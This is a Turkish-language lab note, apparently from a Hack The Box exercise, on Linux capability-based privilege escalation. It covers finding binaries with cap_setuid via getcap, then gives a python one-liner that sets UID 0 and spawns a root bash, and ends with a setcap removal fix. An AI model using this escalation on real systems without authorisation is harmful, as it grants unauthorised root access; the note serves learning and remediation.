

# Linux Capability Tabanlı Hak Yükseltme (Python cap_setuid)

**Etiketler:** `#privilege-escalation` `#linux-capabilities` `#python` `#htb-cap` `#lotl`
**Referans:** [GTFOBins - Python](https://gtfobins.github.io/gtfobins/python/)

## 1. Zafiyet Tespiti: `getcap` Komutu

Sistemdeki **Linux capabilities** (yetenekleri) taramak için şu komut kullanılır:
`getcap -r / 2>/dev/null`

*   `getcap`: Bir dosyanın hangi capability'lere sahip olduğunu gösterir.
*   `-r /`: Root (`/`) dizininden başlayarak tüm dosya sistemini recursive (iç içe) tarar.
*   `2>/dev/null`: İzin hatalarını (Permission denied) gizler, sadece temiz sonuçları ekrana basar.

**Capability (Yetenek) Nedir?**
Linux'ta klasik `setuid` bit'inin yerine (veya yanında) kullanılırlar. Bunlar root yetkisini parçalara böler ve programlara sadece ihtiyaç duydukları kök yetkilerini verir.

| Capability | Ne yapar? |
| :--- | :--- |
| `cap_setuid` | UID (Kullanıcı Kimliği) değiştirme yetkisi verir. |
| `cap_net_bind_service` | 1024'ten düşük portları (ör. 80, 443) dinleme yetkisi verir. |
| `cap_net_raw` | Raw socket açma (ping aracı gibi) yetkisi verir. |
| `cap_net_admin` | Network ayarlarını değiştirme yetkisi verir. |

**Zafiyetli Çıktı Örneği:**
`/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`
Bu çıktı, `python3.8` aracına normal kullanıcılar tarafından çalıştırılsa bile `setuid()` çağrısı yapma (kendini root yapma) yetkisi verildiğini gösterir.

## 2. Sömürü (Exploitation): Python ile Root Shell Alma

Bu yetkiyi kullanarak root kabuğu (shell) açan komut:
`python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'`

**Satır Satır Analiz:**
*   `import os;` : Python'ın işletim sistemi ile konuşmasını sağlayan `os` modülünü yükler.
*   `os.setuid(0);` : Process'in **UID**'sini `0` (root) yapar. Normalde bunu sadece root yapabilir ancak `python3.8` binary'sine `cap_setuid` verildiği için kernel buna izin verir.
*   `os.system("/bin/bash")` : Yeni bir bash process'i başlatır. Bu bash, parent process'in (root olan Python'un) UID'sini miras alır ve kök yetkilerinde çalışır.

**Doğrulama:**
Kabuk açıldıktan sonra `id` komutu çalıştırılmalıdır. Beklenen çıktı:
`uid=0(root) gid=0(root) groups=0(root)`

## 3. Savunma / Onarım (Remediation)
Bu zafiyeti kapatmak ve yetkili durumu geri almak için root yetkileriyle şu komut çalıştırılmalıdır:
`sudo setcap -r /usr/bin/python3.8`